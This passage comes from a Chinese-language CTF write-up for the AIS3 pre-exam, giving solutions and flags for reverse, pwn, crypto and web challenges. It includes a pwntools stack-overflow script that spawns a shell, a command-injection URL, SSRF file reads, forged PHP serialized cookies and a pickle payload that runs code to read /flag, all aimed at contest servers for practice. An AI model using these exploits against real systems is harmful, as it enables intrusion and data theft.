<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;----[----&gt;+&lt;]&gt;++.++++++++.++++++++++.&gt;-[-----&gt;+&lt;]&gt;.+[---&gt;++&lt;]&gt;+++.&gt;-[---&gt;+&lt;]&gt;-.[----&gt;+++++&lt;]&gt;-.[--&gt;+&lt;]&gt;---.[---&gt;++&lt;]&gt;---.++[-&gt;+++&lt;]&gt;.+[--&gt;+&lt;]&gt;+.[---&gt;++&lt;]&gt;---.++[-&gt;+++&lt;]&gt;.+++.[---&gt;+&lt;]&gt;----.[--&gt;+&lt;]&gt;-----.[-&gt;++&lt;]&gt;+.-[----&gt;+++&lt;]&gt;.--------.&gt;-[---&gt;+&lt;]&gt;.-[-----&gt;+&lt;]&gt;-.++++++++.--[-----&gt;+++&lt;]&gt;.+++.[---&gt;+&lt;]&gt;-.-[--&gt;+&lt;]&gt;---.++[---&gt;+++++&lt;]&gt;.++++++++++++++.+++[-&gt;+++++&lt;]&gt;.[-----&gt;+&lt;]&gt;++.&gt;-[-----&gt;+&lt;]&gt;.---[-&gt;++&lt;]&gt;-.++++++.[---&gt;+&lt;]&gt;+++.+++.[-]</span><br></pre></td></tr></table></figure>

<h3 id="Flag-5"><a href="#Flag-5" class="headerlink" title="Flag"></a>Flag</h3><p><code>AIS3{Th1s_1s_br4iNFUCK_bu7_m0r3_ez}</code></p>
<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="BOF"><a href="#BOF" class="headerlink" title="BOF"></a>BOF</h2><blockquote>
<p><strong>189 solves</strong></p>
</blockquote>
<h3 id="題目-7"><a href="#題目-7" class="headerlink" title="題目"></a>題目</h3><blockquote>
<p>That is easy-peasy challenge and even my grandma can do.</p>
<p>nc 60.250.197.227 10000</p>
<p>Challenge environment: Ubuntu 18.04</p>
</blockquote>
<h3 id="File-6"><a href="#File-6" class="headerlink" title="File"></a>File</h3><p><a href="https://pre-exam.ais3.org/files/11d14c680ee0519800bf4b7390da49b5/bof-767fdf896cf9838c0294db24eaa1271ebf15a6e638a873e94ab9682ef28464b4?token=eyJ1c2VyX2lkIjoxOTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjh9.Xt960g.YHP8JWgYM3hlRmcPqBEIUUKXmuU" target="_blank" rel="noopener">BOF</a></p>
<h3 id="解法-7"><a href="#解法-7" class="headerlink" title="解法"></a>解法</h3><p>透過IDA-Pro decompile後可以發現<code>system(&quot;sh&quot;)</code><br>查看記憶體位置後再測試一下中間需要塞入多少bytes<br>可以發現本機塞入52個字元後會開始引響<code>rip</code><br>但是在Ubuntu上似乎需要-4(這部分是猜到的)<br>最後寫個腳本即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">'60.250.197.227'</span>, <span class="string">'10000'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">target = p64(<span class="number">0x400687</span>)</span><br><span class="line">r.sendline(<span class="string">b'A'</span>*<span class="number">48</span> + target)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="Flag-6"><a href="#Flag-6" class="headerlink" title="Flag"></a>Flag</h3><p><code>AIS3{OLd_5ChOOl_tr1ck_T0_m4Ke_s7aCk_A116nmeNt}</code></p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Brontosaurus"><a href="#Brontosaurus" class="headerlink" title="Brontosaurus"></a>Brontosaurus</h2><blockquote>
<p><strong>380 solves</strong></p>
</blockquote>
<h3 id="題目-8"><a href="#題目-8" class="headerlink" title="題目"></a>題目</h3><blockquote>
<p>Brontosaurus peek at last year’s problems with a long neck and picked up “KcufsJ”.</p>
</blockquote>
<h3 id="File-7"><a href="#File-7" class="headerlink" title="File"></a>File</h3><p><a href="https://pre-exam.ais3.org/files/485ad6e60bae0bcff72147bc9a39fdb1/KcufsJ?token=eyJ1c2VyX2lkIjoxOTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjJ9.Xt99Kg.fDdDMx4trtkxy8cmQmrPCwvdkNg" target="_blank" rel="noopener">KcufsJ</a></p>
<h3 id="解法-8"><a href="#解法-8" class="headerlink" title="解法"></a>解法</h3><p>開啟檔案後會發現是JSFuck<br>但是直接拿去執行會出錯<br>需要先reverse字串後再執行即可</p>
<h3 id="Flag-7"><a href="#Flag-7" class="headerlink" title="Flag"></a>Flag</h3><p><code>AIS3{Br0n7Os4uru5_ch3at_3asi1Y}</code></p>
<h2 id="T-Rex"><a href="#T-Rex" class="headerlink" title="T-Rex"></a>T-Rex</h2><blockquote>
<p><strong>381 solves</strong></p>
</blockquote>
<h3 id="題目-9"><a href="#題目-9" class="headerlink" title="題目"></a>題目</h3><blockquote>
<p>Tyrannosaurus-rex is an nihilist.</p>
</blockquote>
<h3 id="File-8"><a href="#File-8" class="headerlink" title="File"></a>File</h3><p><a href="https://pre-exam.ais3.org/files/46ce9cf3bdd86cf183820863cf7d45c6/prob?token=eyJ1c2VyX2lkIjoxOTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjI3fQ.Xt9-mw.eiY4Nsp3Odo637z3ZL6xn9U_ZrY" target="_blank" rel="noopener">Prob</a></p>
<h3 id="解法-9"><a href="#解法-9" class="headerlink" title="解法"></a>解法</h3><p>很明顯的，只要對照Table即可<br>(當然，還是寫code不傷眼)</p>
<h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">table=&#123;<span class="string">'!!'</span>:<span class="string">'V'</span>,<span class="string">'!@'</span>:<span class="string">'5'</span>,<span class="string">'!#'</span>:<span class="string">'I'</span>,<span class="string">'!$'</span>:<span class="string">'K'</span>,<span class="string">'!%'</span>:<span class="string">'E'</span>,<span class="string">'!&amp;'</span>:<span class="string">'U'</span>,<span class="string">'@!'</span>:<span class="string">'F'</span>,<span class="string">'@@'</span>:<span class="string">'0'</span>,<span class="string">'@#'</span>:<span class="string">'W'</span>,<span class="string">'@$'</span>:<span class="string">'G'</span>,<span class="string">'@%'</span>:<span class="string">'3'</span>,<span class="string">'@&amp;'</span>:<span class="string">'Z'</span>,<span class="string">'#!'</span>:<span class="string">'Y'</span>,<span class="string">'#@'</span>:<span class="string">'M'</span>,<span class="string">'##'</span>:<span class="string">'H'</span>,<span class="string">'#$'</span>:<span class="string">'B'</span>,<span class="string">'#%'</span>:<span class="string">'C'</span>,<span class="string">'#&amp;'</span>:<span class="string">'8'</span>,<span class="string">'$!'</span>:<span class="string">'J'</span>,<span class="string">'$@'</span>:<span class="string">'2'</span>,<span class="string">'$#'</span>:<span class="string">'S'</span>,<span class="string">'$$'</span>:<span class="string">'X'</span>,<span class="string">'$%'</span>:<span class="string">'7'</span>,<span class="string">'$&amp;'</span>:<span class="string">'R'</span>,<span class="string">'%!'</span>:<span class="string">'6'</span>,<span class="string">'%@'</span>:<span class="string">'9'</span>,<span class="string">'%#'</span>:<span class="string">'4'</span>,<span class="string">'%$'</span>:<span class="string">'T'</span>,<span class="string">'%%'</span>:<span class="string">'P'</span>,<span class="string">'%&amp;'</span>:<span class="string">'D'</span>,<span class="string">'&amp;!'</span>:<span class="string">'1'</span>,<span class="string">'&amp;@'</span>:<span class="string">'L'</span>,<span class="string">'&amp;#'</span>:<span class="string">'Q'</span>,<span class="string">'&amp;$'</span>:<span class="string">'A'</span>,<span class="string">'&amp;%'</span>:<span class="string">'N'</span>,<span class="string">'&amp;&amp;'</span>:<span class="string">'O'</span>&#125;</span><br><span class="line"></span><br><span class="line">ordi = <span class="string">'&amp;$ !# $# @% &#123; %$ #! $&amp; %# &amp;% &amp;% @@ $# %# !&amp; $&amp; !&amp; !@ _ $&amp; @% $$ _ @$ !# !! @% _ #! @@ !&amp; _ $# &amp;&amp; #@ !% %$ ## !# &amp;% @$ _ $&amp; &amp;$ &amp;% %&amp; &amp;&amp; #@ _ !@ %$ %&amp; %! $$ &amp;# !# !! &amp;% @% ## $% !% !&amp; @! #&amp; &amp;&amp; %&amp; !% %$ %# %$ @% ## %@ @@ $% ## !&amp; #% %! %@ &amp;@ %! &amp;@ %$ $# ## %# !$ &amp;% @% !% !&amp; $&amp; &amp;% %# %@ #$ !# &amp;&amp; !&amp; #! %! ## #$ @! #% !! $! $&amp; @&amp; %% @@ &amp;&amp; #&amp; @% @! @# #@ @@ @&amp; !@ %@ !# !# $# $! !@ &amp;$ $@ !! @! &amp;# @$ &amp;! &amp;# $! @@ &amp;@ !% #% #! &amp;@ &amp;$ @@ &amp;$ &amp;! !&amp; #! !# ## %$ !# !# %$ &amp;! !# @# ## @@ $! $$ %# %$ @% @&amp; $! &amp;! !$ $# #$ $&amp; #@ %@ @$ !% %&amp; %! @% #% $! !! #$ &amp;# ## &amp;# &amp;&amp; $&amp; !! !% $! @&amp; !% &amp;@ !&amp; $! @# !@ !&amp; @$ $% #&amp; #$ %@ %% %% &amp;! $# !# $&amp; #@ &amp;! !# @! !@ @@ @@ ## !@ $@ !&amp; $# %&amp; %% !# !! $&amp; !$ $% !! @$ @&amp; !&amp; &amp;@ #$ &amp;&amp; @% $&amp; $&amp; !% &amp;! &amp;&amp; &amp;@ &amp;% @$ &amp;% &amp;$ &amp;@ $$ &#125;'</span></span><br><span class="line">format_ordi = ordi.split()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> format_ordi:</span><br><span class="line">    <span class="keyword">if</span>(i==<span class="string">'&#123;'</span> <span class="keyword">or</span> i==<span class="string">'&#125;'</span> <span class="keyword">or</span> i==<span class="string">'_'</span>):</span><br><span class="line">        print(i,end=<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(table[i],end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure>

<h3 id="Flag-8"><a href="#Flag-8" class="headerlink" title="Flag"></a>Flag</h3><p><code>AIS3{TYR4NN0S4URU5_R3X_GIV3_Y0U_SOMETHING_RANDOM_5TD6XQIVN3H7EUF8ODET4T3H907HUC69L6LTSH4KN3EURN49BIOUY6HBFCVJRZP0O83FWM0Z59IISJ5A2VFQG1QJ0LECYLA0A1UYIHTIIT1IWH0JX4T3ZJ1KSBRM9GED63CJVBQHQORVEJZELUJW5UG78B9PP1SIRM1IF500H52USDPIVRK7VGZULBO3RRE1OLNGNALX}</code></p>
<h2 id="Octopus"><a href="#Octopus" class="headerlink" title="Octopus"></a>Octopus</h2><blockquote>
<p><strong>103 solves</strong></p>
</blockquote>
<h3 id="題目-10"><a href="#題目-10" class="headerlink" title="題目"></a>題目</h3><blockquote>
<p>BB84 quantum key distribution has 8 main directions,</p>
<p>just like a cute octopus A __ A.</p>
</blockquote>
<h3 id="File-9"><a href="#File-9" class="headerlink" title="File"></a>File</h3><p><a href="https://pre-exam.ais3.org/files/5f1d8f09cd100ff6c3aef9e43dd39109/output?token=eyJ1c2VyX2lkIjoxOTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjV9.Xt9_Ig.Cr3dh43HJY9dNY-BdNyRkwCrAYQ" target="_blank" rel="noopener">output</a><br><a href="https://pre-exam.ais3.org/files/b82ef51ba5a71f0767c68979d428c95a/prob.py?token=eyJ1c2VyX2lkIjoxOTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjZ9.Xt9_Ig.hqnGUH-0Ky4_GIOjJo0rN3HqzaU" target="_blank" rel="noopener">prob.py</a></p>
<h3 id="解法-10"><a href="#解法-10" class="headerlink" title="解法"></a>解法</h3><p>先參照<a href="https://zh.wikipedia.org/wiki/%E9%87%8F%E5%AD%90%E5%AF%86%E9%91%B0%E5%88%86%E7%99%BC" target="_blank" rel="noopener">維基百科</a>了解BB84如何加密<br>題目中已經給好Basis<br>我們只要參照Table就可以分別對應出其箭號方向(Basis需相同)，進而找到是0/1<br><img src="https://i.imgur.com/Q2V5Pnc.png" alt=""><br>最終檔案中最後一筆資料與結果分別轉binary後xor轉字串即可</p>
<h3 id="Flag-9"><a href="#Flag-9" class="headerlink" title="Flag"></a>Flag</h3><p><code>AIS3{EveryONe_kn0w_Quan7um_k3Y_Distr1but1on--BB84}</code></p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Squirrel"><a href="#Squirrel" class="headerlink" title="Squirrel"></a>Squirrel</h2><blockquote>
<p><strong>220 solves</strong></p>
</blockquote>
<h3 id="題目-11"><a href="#題目-11" class="headerlink" title="題目"></a>題目</h3><blockquote>
<p>Hack those creepy rats.</p>
<p><a href="https://squirrel.ais3.org/" target="_blank" rel="noopener">https://squirrel.ais3.org/</a></p>
</blockquote>
<h3 id="解法-11"><a href="#解法-11" class="headerlink" title="解法"></a>解法</h3><p>從scource code可以發現到我們可以訪問目錄中的檔案<br><img src="https://i.imgur.com/IXwhBr6.png" alt=""><br>先去看看api.php<br>會發現到裡面有<code>exec</code>，可以猜測這裡會出漏洞<br><img src="https://i.imgur.com/g7Oy0E6.png" alt=""><br>先閉合，再輸入指令就可以了</p>
<blockquote>
<p><a href="https://squirrel.ais3.org/api.php?get=&#39;;ls" target="_blank" rel="noopener">https://squirrel.ais3.org/api.php?get=&#39;;ls</a> /‘<br>檔案可以先從當前目錄找，如果沒有，可以猜是在根目錄或是find猜猜看檔案名稱</p>
</blockquote>
<h3 id="Flag-10"><a href="#Flag-10" class="headerlink" title="Flag"></a>Flag</h3><p><code>AIS3{5qu1rr3l_15_4_k1nd_0f_b16_r47}</code></p>
<h2 id="Shark"><a href="#Shark" class="headerlink" title="Shark"></a>Shark</h2><blockquote>
<p><strong>261 solves</strong></p>
</blockquote>
<h3 id="題目-12"><a href="#題目-12" class="headerlink" title="題目"></a>題目</h3><blockquote>
<p>Let’s dive deep again this year.</p>
<p><a href="https://shark.ais3.org/" target="_blank" rel="noopener">https://shark.ais3.org/</a></p>
</blockquote>
<h3 id="解法-12"><a href="#解法-12" class="headerlink" title="解法"></a>解法</h3><p>一開始不知道這題要做什麼<br>於是到網路上找到去年的write-up，發現倒是在網址後面path造成的SSRF漏洞<br>可以先到<a href="https://shark.ais3.org/?path=php://filter/resource=/etc/hosts" target="_blank" rel="noopener">https://shark.ais3.org/?path=php://filter/resource=/etc/hosts</a> 獲取ip<br>根據題目，flag藏在附近的server上，所以可以從1開始慢慢手動找<br>最終可以在<a href="https://shark.ais3.org/?path=http://172.22.0.2/flag" target="_blank" rel="noopener">https://shark.ais3.org/?path=http://172.22.0.2/flag</a> 獲得flag</p>
<h3 id="Flag-11"><a href="#Flag-11" class="headerlink" title="Flag"></a>Flag</h3><p><code>AIS3{5h4rk5_d0n&#39;7_5w1m_b4ckw4rd5}</code></p>
<h2 id="Elephant"><a href="#Elephant" class="headerlink" title="Elephant"></a>Elephant</h2><blockquote>
<p><strong>165 solves</strong></p>
</blockquote>
<h3 id="題目-13"><a href="#題目-13" class="headerlink" title="題目"></a>題目</h3><blockquote>
<p>Do elephants love cookies?</p>
<p><a href="https://elephant.ais3.org/" target="_blank" rel="noopener">https://elephant.ais3.org/</a></p>
<p>IMPORTANT</p>
<pre><code>There&apos;s a hint in the webpage</code></pre></blockquote>
<h3 id="解法-13"><a href="#解法-13" class="headerlink" title="解法"></a>解法</h3><p>在cookie裡面可以看到一個<code>elephant_user</code>，將值base64 decode後會發現是php序列化後的資料格式<br>但是由於不知道底層是將甚麼class序列化，目前還用不上它<br>由於沒有其他資訊了，想到最初web學到的知識<br>開始搜尋 <code>/robots.txt</code>, <code>/.git</code>, <code>/.svn</code> …<br>發現到<code>/.git</code>有githack漏洞<br>在網路上找到githack工具直接獲得網頁原始碼</p>
<p>透過原始碼可以發現到token會經過md5加密<br>而要獲取flag需要在<code>strcmp($flag, $this-&gt;token)==0</code>才能獲得<br>顯然token需要是特殊值才能破解它<br>發現到token是NAN可以解<br>於是將class複製後將<code>__construct</code>中關於<code>token</code>的部分註解<br>再將class serialize base64_encode<br>將cookie複寫即可</p>
<h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p><code>AIS3{0nly_3l3ph4n75_5h0uld_0wn_1v0ry}</code></p>
<h2 id="Snake"><a href="#Snake" class="headerlink" title="Snake"></a>Snake</h2><blockquote>
<p><strong>137 solves</strong></p>
</blockquote>
<h3 id="題目-14"><a href="#題目-14" class="headerlink" title="題目"></a>題目</h3><blockquote>
<p>How to read that flag?</p>
<p><a href="https://snake.ais3.org/" target="_blank" rel="noopener">https://snake.ais3.org/</a></p>
</blockquote>
<h3 id="解法-14"><a href="#解法-14" class="headerlink" title="解法"></a>解法</h3><p>打開後會看到一個python檔，且可以接收pickle data<br>如果要符合 <code>data is not data</code> 理論上不可能<br>除非寫一個function讓他可以每次詢問與上次相反<br>但是pickle中能寫入的內容會是靜態的，function沒辦法寫入<br>所以我們目標會是後面的 <code>return str(data)</code> ，只要data是flag就可以了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line">import os</span><br><span class="line">class test():</span><br><span class="line">	def __reduce__(self):</span><br><span class="line">		return (exec,(&#39;globals()[\&#39;str\&#39;]&#x3D;lambda data : open(\&#39;&#x2F;flag\&#39;).read()&#39;,))</span><br><span class="line"></span><br><span class="line">print(base64.b64encode(pickle.dumps(test())))</span><br><span class="line">data &#x3D; (pickle.loads(pickle.dumps(test())))</span><br></pre></td></tr></table></figure>

<p>最後將pickle檔案放上去即可!</p>
<h3 id="Flag-12"><a href="#Flag-12" class="headerlink" title="Flag"></a>Flag</h3><p><code>AIS3{7h3_5n4k3_w1ll_4lw4y5_b173_b4ck.}</code></p>
<h2 id="心得"><a href="#心得" class="headerlink" title="心得"></a>心得</h2><p>第一次打AIS3 pre-exam，收穫意外的多<br>尤其在web部分花了特別多的心力在上面，也藉此學到像是 phpserialize 和 python的pickle data<br>Crypto很多都是參考去年的write-up 自己腦洞大開解出來的並不多<br>Pwn是我很不熟悉的領域，所以碰的題目不多<br>Reverse印象最深刻的是音遊w，第一次用cheat engine XDD<br>不過那題的正解似乎是先返組譯java後trace code找到flag如何產生<br>整體難度個人覺得中偏難w<br>這次的排名在第96，明年繼續加油OwO</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>AIS3</tag>
        <tag>CTF write-up</tag>
      </tags>
  </entry>
</search>
